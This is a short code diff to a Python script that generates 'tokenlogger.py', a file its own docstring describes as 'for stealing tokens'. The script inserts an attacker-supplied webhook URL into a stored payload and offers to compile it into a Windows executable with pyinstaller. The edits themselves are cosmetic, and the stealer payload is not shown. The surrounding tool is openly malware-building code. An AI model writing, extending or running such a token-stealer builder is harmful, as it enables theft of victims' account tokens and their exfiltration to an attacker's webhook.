@@ -15,7 +15,6 @@
  along with this program.  If not, see <https://www.gnu.org/licenses/>.
  """
 
-
 import os
 from colorama import Fore
 
@@ -87,6 +86,11 @@ def main():
 
 
 class Create:
+    """
+    Creates a file called tokenlogger.py for stealing tokens.
+
+    Deprecated!
+    """
     def __init__(self, webhook_url):
         # Create a new file inside a folder called tokenlogger
         print("[*] Creating tokenlogger.py...")
@@ -99,7 +103,8 @@ class Create:
             f.write(FILE_CONTENT.replace("WEBHOOK_URL", f"'{webhook_url}'"))
             print(Fore.GREEN + "[*] Successfully created tokenlogger.py")
             f.close()
-            print(Fore.GREEN + "[*] To make it as .exe file, run the following command: pyinstaller --onefile tokenlogger.py OR do it now? (y/n)")
+            print(
+                Fore.GREEN + "[*] To make it as .exe file, run the following command: pyinstaller --onefile tokenlogger.py OR do it now? (y/n)")
             choice = input("[*] > ")
             if choice == "y":
                 try:
